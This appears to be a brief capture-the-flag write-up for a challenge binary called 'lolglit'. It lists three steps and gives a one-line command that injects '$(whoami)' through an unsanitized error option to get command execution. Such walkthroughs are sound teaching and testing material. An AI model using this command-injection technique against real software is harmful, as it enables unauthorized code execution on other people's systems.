## Lolglit

1. Get echo to error by tring to write to a nonexistent directory
2. Discover the error option
3. Use the unsanitized error option to perform RCE

```
echo "aoeu > /tmp/a/" |  ./lolglit -e \$\(whoami\)
```
